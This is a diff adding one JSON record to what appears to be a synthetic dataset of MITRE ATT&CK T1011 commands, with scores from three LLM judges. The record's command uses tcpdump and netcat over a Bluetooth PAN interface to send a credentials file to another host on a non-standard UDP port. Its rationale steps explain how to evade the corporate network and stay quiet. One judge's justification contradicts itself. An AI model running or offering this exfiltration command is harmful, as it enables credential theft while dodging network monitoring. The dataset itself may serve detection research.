@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i bnep0 -nn udp port 53287 -U -w /dev/null >/dev/null 2>&1 & nc -u -s 192.168.44.10 192.168.44.20 53287 < /var/tmp/.cache/creds.bin",
+  "explanation": "Uses Bluetooth PAN (bnep0) and UDP on a non-standard port to exfiltrate a blob while silently monitoring only that traffic. This is exfiltration over a different network medium per T1011.",
+  "rationale_steps": [
+    "Select Bluetooth PAN to avoid the primary corporate network.",
+    "Use UDP on an uncommon port (53287) to blend with low-noise traffic.",
+    "Run tcpdump scoped to bnep0 and that port to minimize footprint.",
+    "Stream the file with netcat bound to the bnep0 source address."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-e5a3a6fa",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Two commands are correctly separated by backgrounding, with valid flags for tcpdump and nc and proper redirections, and no quoting or parsing issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates data over a Bluetooth PAN (bnep0) via UDP consistent with T1011, but tcpdump typically needs elevated privileges and the specified source IP must belong to bnep0 for routing to use that medium.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:39:27.022668Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is mostly well-formed with valid use of nohup, background execution, redirection, and nc flags, but the nc command is missing the required destination port as a separate argument (the syntax `nc -u -s 192.168.44.10 192.168.44.20 53287` is correct for specifying source IP and destination host:port, so this is actually valid).",
+        "semantic_score": 4,
+        "semantic_justification": "The command plausibly demonstrates T1011 by using a Bluetooth PAN interface (bnep0) for UDP exfiltration of a credential file to a remote host on a non-standard port, though the tcpdump component writing to /dev/null serves no meaningful monitoring or operational purpose and slightly undermines the claimed 'silent monitoring' rationale.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2026-02-18T22:00:43.067520Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a well-formed Bash string using standard command separators, valid tool flags for tcpdump and netcat, and correct input/output redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively attempts exfiltration over a Bluetooth interface (bnep0) using netcat, though the tcpdump component is operationally redundant and the 'Privilege: None' claim is inaccurate as tcpdump requires elevated privileges to capture traffic.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:00:47.532430Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
